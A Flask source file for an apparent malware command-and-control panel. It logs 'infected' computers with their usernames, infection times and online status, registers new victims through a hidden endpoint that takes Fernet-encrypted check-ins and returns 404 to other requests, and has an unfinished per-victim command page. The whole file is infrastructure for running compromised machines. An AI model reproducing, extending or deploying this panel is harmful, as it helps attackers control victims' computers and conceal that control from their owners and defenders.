# app.py
import os
from sqlite3 import DatabaseError
from flask import Flask, render_template, redirect, url_for, request, send_file, abort
from flask_sqlalchemy import SQLAlchemy
from sqlalchemy.ext.declarative import declarative_base
from datetime import datetime
from sqlalchemy import create_engine
from sqlalchemy.sql import text
from dotenv import load_dotenv
from cryptography.fernet import Fernet
from ftfy import fix_text
load_dotenv()

# I use base for creating database
Base = declarative_base()
# basedir is defined so the database is always placed in the same directory as app.py
basedir = os.path.abspath(os.path.dirname(__file__))
# key is gotten from the .env file, env file structure:
# # .env
# KEY='YOUR_KEY'

# Key is the deciphering key for fernet
key = os.getenv('KEY')
# Instance of fernet with key
fernet = Fernet(str(key))
# Instance of SQLAlchemy
db = SQLAlchemy()
# The app instance
app = Flask(__name__, static_folder='templateStatic')
# Setting the location of the database
app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///' + os.path.join(basedir, 'icomputers.sqlite3')
# Initialization of the database with app
db.init_app(app)

# The structure of database + data types
class computersdata(db.Model):  # type: ignore
    id = db.Column('computer_id', db.Integer, primary_key=True)    # Id is the primary element, it must be unique and it is automatically set
    infrom = db.Column(db.DateTime) # The Date and Time of pc being infected
    uname = db.Column(db.String(255)) # Username char limit is 256 characters, so...
    notes = db.Column(db.String(500)) # Notes can be 500 characters long
    status = db.Column(db.Boolean) # Status is here, so you can know if the pc is connected
    def __init__(self, infrom, uname, notes, status: bool): # Just init method, I'm not really gonna comment this
        self.infrom = infrom
        self.uname = uname
        self.notes = notes
        self.status = status

@app.get('/') # Homepage, supports only GET requests
def home():
    return render_template('home.html', computersdata=computersdata.query.all()) # Returns the home.html with computersdata as all rows in db

@app.route('/person') # If somebody misspells (this on purpose) /person/<id>, it wont throw 404 error, but 
def singleperson():
    return render_template('error.html', case='Please supply id', type='normal'), 406

@app.route('/person/<id>', methods=['GET', 'POST'])  # type: ignore  # route, supports GET and POST req., 
def persons(id:int):
    ### Old method, new one looks nicer
    #args = request.args
    #if 'id' not in args:
    #    return render_template('error.html', case='ID Not provided')
    #idC = args['id']
    try:
        idC = int(id) # If the id is a letter, will return error
    except:
        return render_template('error.html', case='ID Cannot be a letter', type='normal')
    user = computersdata.query.get(idC) # Now that id is num, we get him from db
    if user is None: # User must exist
        return render_template('error.html', case='Invalid computer id provided', type='normal')
    WIPCOMMANDS = ['Id is '+str(idC), 'Second command'] # This feature is WIP, so there are some example cmds
    if request.method == 'GET': # If person just loads this, they will get example cmds
        return render_template('person.html', computer=user, list=WIPCOMMANDS)
    if request.method == 'POST': # If req method is POST post, I'd say pretty self explanatory
        try:
            data = request.form['CommandToInput'] # Requests the content of the form
        except:
            return render_template('error.html', case='Please dont fiddle with this pages code. I\'m just tired.')
        if data != '': # If data doesnt contain anything just return empty str
            SECONDATA = ['Id is '+str(idC), 'Second command', 'Written in input: ' + data] # Just adds 3rd line to the thing
            return render_template('person.html', computer=user, list=SECONDATA) # Returns sec data
        return render_template('person.html', computer=user, list=WIPCOMMANDS) # If emtpy, no need to return empty example ig
    
@app.route('/notes') # The same as earlier, but for notes
def singlenotes():
    return render_template('error.html', case='Please supply id', type='normal'), 406

@app.route('/notes/<id>', methods=['GET', 'POST'])
def notes(id:int):
    ### Old method, new one looks nicer
    #args = request.args
    #if 'id' not in args:
    #    return render_template('error.html', case='ID Not provided')
    #idC = args['id']
    try:
        idC = int(id) # If the id is a letter, will return error
    except:
        return render_template('error.html', case='ID Cannot be a letter', type='normal'), 502
    user = computersdata.query.get(idC) # Now that id is num, we get him from db
    if user is None: # User must exist
        return render_template('error.html', case='Invalid computer id provided', type='normal'), 502
    if request.method == 'GET':
        return render_template('notes.html', user=user) # If the person opens page, sends normal response
    if request.method == 'POST': # If this is server event
        try:
            newNote = request.form['note'] # Requests the content of the form
        except:
            return render_template('error.html', case='Please dont fiddle with this pages code. I\'m just tired.')
        user = computersdata.query.get(idC) # Gets the user from the db, thanks to check we know the user exists
        refNote = newNote.replace('-id-', str(user.id)) # Replaces "-id-" in note with user id
        user.notes = refNote # Actually replaces the note in database
        db.session.add(user) # Commits the change so its global
        db.session.commit() # Saves to the database
        return render_template('notes.html', user=user) # Returns the notes.html with the new user note

    return render_template('error.html', case='NOTES UNKNOWN ERROR') # If by now it hasn't returned anything, i have no idea what hapenned

## On this line replace this with "@app.route('/your_url', methods=['GET', 'POST'])" or the function wont work
def addPc():
    if request.method != 'POST': # We want to block all non POST method, and also hide the presence of this site, so error 404 it is
        abort(404)
    try:
        data = request.data # We request the sent data, and even though I think these are required, I dont want any errors, so... 404 it is!
    except:
        abort(404)
    try:
        deData = fernet.decrypt(data.decode('utf-8')) # If the data are correctly encoded, go ahead, and if it is wrong... You guessedd it! 404
    except:
        abort(404)
    strData = str(deData) # Convert the data from bytes to string
    fixedData = fix_text(strData) # If there were any unicode errors, this should fix them
    sepData = list(fixedData.split('?')) # Splits the string with ? into list
    pcInfrom = datetime.today() # When the user gets infected, this should just be still ok,
    pcUname = sepData[0].removeprefix('b\'') # Just bytes prefix, this extracts username
    pcNotes = sepData[1] # Gets default notes
    pcStatus = sepData[2].removesuffix("'") # Again, bytes suffix, extracts 1
    pcstat = False # Presets the pc status to false
    if pcStatus == '1': # if the pcStatus is 1, it sets pcStat to true
        pcstat = True
    newPc = computersdata(infrom=pcInfrom, uname=pcUname, notes=pcNotes, status=pcstat) # Creates the row with the data
    db.session.add(newPc) # Commits newUser to database
    db.session.commit() # Saves it to database
    return str(newPc.id), 200 # Returns the id of the pc

@app.get('/favicon.ico') # Just, you know, the thing on left on the card
def favicon():
    filename = 'templateStatic/favicon.ico'
    return send_file(filename, mimetype='image/gif')

@app.errorhandler(404) # Handles all ERR_NOT_FOUND errors
def page_not_found(e):
    return render_template('error.html', case='Page not found', type='normal'), 404 # Returns my error.html with 404 error

@app.errorhandler(DatabaseError) # If it somehow fails to connect to database
def special_exception_handler(e):
    return render_template('error.html', case='We are sorry, but our services are currentl unavailable or the database does not exist', type='DB'), 500 # Returns this, its late and I'm too tired to write this comprehensibly


if __name__ == "__main__": # This wont work if it is imported or smth
    with app.app_context(): # With app context
        engine = create_engine('sqlite:///icomputers.sqlite3') # Links/creates to database file
        Base.metadata.create_all(engine) # Idk why this here, leave me alone
        db.create_all() # Maybe creates database, idk, it is required
    app.run(debug=True) # Runs the app, currently in debug mode, which means that it reloads on change in THIS file

# Contents of this project were written by malanak, DONT REMOVE THIS EVER, if you wanna base something on this extra specific project, sure, add what you did BELOW this statement